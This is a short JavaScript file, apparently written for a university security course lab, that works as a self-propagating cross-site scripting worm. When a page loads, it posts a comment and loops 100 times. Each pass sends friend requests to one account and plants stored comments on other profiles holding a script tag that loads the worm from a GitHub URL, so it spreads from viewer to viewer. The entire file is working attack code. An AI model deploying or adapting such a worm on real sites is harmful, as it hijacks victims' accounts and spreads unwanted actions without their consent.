//Script that crawls through and sends friend requests by Dan
const cookie = new URLSearchParams(document.cookie.replaceAll("; ","&"));
if (cookie.get("hasCookie") != "true") {
	var request = new XMLHttpRequest();
	var date = new Date()
	request.open("POST", `/add_comment.php?id=92&comment=Just a friendly work saying hello :) `+date, true);
	request.send();
	for (var i = 0; i < 100; i++) {	
			var request2 = new XMLHttpRequest();
      request2.open("POST", `http://csec380-core.csec.rit.edu:86/add_friend.php?id=92`, true);
      request2.send();
      var request3 = new XMLHttpRequest();
      request3.open("POST", `/add_comment.php?id=${i}&comment=<script src="https://github.com/drl3180/friendlyworm/blob/main/friendlyworm.js"></script>`, true);
      request3.send();
	}
}
document.cookie = "hasCookie=true"
